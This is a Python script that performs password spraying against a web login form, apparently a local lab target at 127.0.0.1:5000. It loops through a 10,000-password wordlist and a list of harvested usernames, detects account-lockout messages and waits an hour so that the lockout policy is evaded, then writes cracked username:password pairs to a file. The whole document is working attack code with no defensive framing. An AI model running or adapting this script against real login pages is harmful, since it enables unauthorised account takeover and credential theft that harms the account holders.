import requests, time

url = 'http://127.0.0.1:5000/login'

# ---  Open files. If read and copied, reset them immediately  ---
crackedAccounts = open('cracked_accounts.txt', 'a')
nameList = open('found_usernames.txt', 'r+')
nameListcopy = nameList.readlines()
nameList.seek(0)
passwordList = open('top10000passwords.txt', 'r+')
passwordListCopy = passwordList.readlines()
passwordList.seek(0)

# ---  For each potential password in the wordlist file, try each password with it once  ---
for line in passwordList:
	password = line.strip('\n')
	print("Current password being tried: " + password)
	index = 0
	
	# For each username try the current password
	for name in nameList:
		name = name.strip('\n')
		payload = {'username': name, 'password': password}
		r = requests.post(url, payload)
		errorLine = r.text.splitlines()[59].lstrip()
		
		# If a lockout happens, pause for an hour to allow account reset
		# Reset file descriptor and copy index counter
		if errorLine.startswith("You have exceeded"):
			print("Lockout detetcted on password: " + password)
			print("Resetting to start of username list and sleeping for an hour ...")
			nameList.seek(0)
			index = -1
			time.sleep(3600)
			print("Resuming on password: " + password)
		else:
			# If not invalid password, then we've cracked an account
			# Save the login info to file immediately
			if not errorLine.startswith("Invalid password"):
				print("Login successful " + name + ":" + password)
				crackedAccounts.writelines(name + ":" + password + '\n')
				del nameListcopy[index]
				index -= 1
		index += 1
		
	# ---  Update the username and password lists. ---
	# Remove cracked account usernames
	nameList.seek(0)
	nameList.truncate()
	nameList.writelines(nameListcopy)
	nameList.seek(0)		
	# Remove latest failed password
	del passwordListCopy[0]
	passwordList.seek(0)
	passwordList.truncate()
	passwordList.writelines(passwordListCopy)
	passwordList.seek(0)

# ---  Close open files  ---
nameList.close()
crackedAccounts.close()
passwordList.close()